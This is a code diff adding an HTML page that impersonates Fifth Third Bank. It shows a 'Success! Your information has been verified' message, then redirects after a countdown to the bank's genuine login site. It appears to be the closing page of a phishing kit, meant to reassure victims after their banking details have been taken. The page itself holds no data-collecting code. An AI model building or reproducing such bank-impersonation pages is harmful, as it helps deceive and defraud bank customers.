@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fifth – Success</title>
+    <link rel="stylesheet" href="res\css\main.css">
+    <style>
+        .cont {
+            padding: 40px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            min-height: 50vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login {
+            background: #fff;
+            padding: 40px 35px 45px;
+            border-radius: 8px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            max-width: 420px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .login .success-icon {
+            font-size: 4rem;
+            line-height: 1;
+            color: #28a745;
+            margin-bottom: 12px;
+        }
+        .login h2 {
+            margin-top: 0;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 1.6rem;
+            color: #1a2a3a;
+        }
+        .login p {
+            margin-top: 0;
+            margin-bottom: 6px;
+            color: #555;
+            font-size: 0.95rem;
+        }
+        .login .redirect-note {
+            margin-top: 16px;
+            font-size: 0.85rem;
+            color: #888;
+        }
+        .login .redirect-note a {
+            color: #0055a5;
+            text-decoration: none;
+        }
+        .login .redirect-note a:hover {
+            text-decoration: underline;
+        }
+        .spinner {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #e9ecef;
+            border-top: 3px solid #0055a5;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 6px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 30px;
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        header .logo img {
+            height: 40px;
+            width: auto;
+        }
+        header .logoo img {
+            height: 32px;
+            width: auto;
+        }
+        header .links {
+            font-size: 0.8rem;
+            color: #555;
+        }
+        header .links a {
+            color: #0055a5;
+            text-decoration: none;
+            margin: 0 6px;
+        }
+        header .links a:hover {
+            text-decoration: underline;
+        }
+        header .links a:first-child {
+            margin-left: 0;
+        }
+
+        .bottom {
+            padding: 14px 30px;
+            font-size: 0.85rem;
+            background: #f8f9fa;
+            border-bottom: 1px solid #e5e5e5;
+            color: #555;
+            min-height: 20px;
+        }
+
+        footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 30px;
+            background: #f2f4f6;
+            border-top: 1px solid #ddd;
+            font-size: 0.75rem;
+            color: #555;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        footer .logo img {
+            height: 28px;
+            width: auto;
+        }
+        footer p {
+            margin: 0;
+            flex: 1;
+        }
+
+        @media (max-width: 600px) {
+            header {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+            }
+            header .links {
+                text-align: center;
+            }
+            .login {
+                padding: 30px 20px;
+            }
+            footer {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ═══ HEADER ═══ -->
+    <header>
+        <div class="logo">
+            <img src="res\img\logo.svg" alt="Fifth Third Bank" />
+        </div>
+        <div class="logoo">
+            <img src="res\img\logoo.png" alt="logo" />
+        </div>
+        <div class="links">
+            <a href="#">CUSTOMER SERVICE</a> |
+            <a href="#">BRANCH &amp; ATM LOCATOR</a>
+        </div>
+    </header>
+
+    <!-- ═══ EMPTY BREADCRUMB ═══ -->
+    <div class="bottom"></div>
+
+    <!-- ═══ MAIN CONTENT ═══ -->
+    <div class="cont">
+
+        <div class="login">
+            <div class="success-icon">✓</div>
+            <h2>Success!</h2>
+            <p>Your information has been verified successfully.</p>
+            <p style="font-size:0.85rem; color:#666;">You will be redirected to your banking portal shortly.</p>
+
+            <div class="redirect-note">
+                <div class="spinner"></div>
+                <br />
+                Redirecting in <span id="countdown">5</span> seconds...
+                <br /><br />
+                <a href="https://secure.53.com/olb/login">Click here</a> if you are not redirected automatically.
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ═══ FOOTER ═══ -->
+    <footer>
+        <p>
+            Copyright &copy; 2024 Fifth Third Bank, National Association.
+            All Rights Reserved. Member FDIC. FDIC Logo Equal Housing Lender
+        </p>
+        <div class="logo">
+            <img src="res\img\logo.svg" alt="Fifth Third Bank" />
+        </div>
+    </footer>
+
+    <!-- ── redirect after 5 seconds with countdown ── -->
+    <script>
+        (function() {
+            var seconds = 5;
+            var countdownEl = document.getElementById('countdown');
+
+            var interval = setInterval(function() {
+                seconds--;
+                if (countdownEl) {
+                    countdownEl.textContent = seconds;
+                }
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    window.location.href = 'https://secure.53.com/olb/login';
+                }
+            }, 1000);
+
+            // fallback redirect just in case
+            setTimeout(function() {
+                window.location.href = 'https://secure.53.com/olb/login';
+            }, 5500);
+        })();
+    </script>
+
+</body>
+</html>
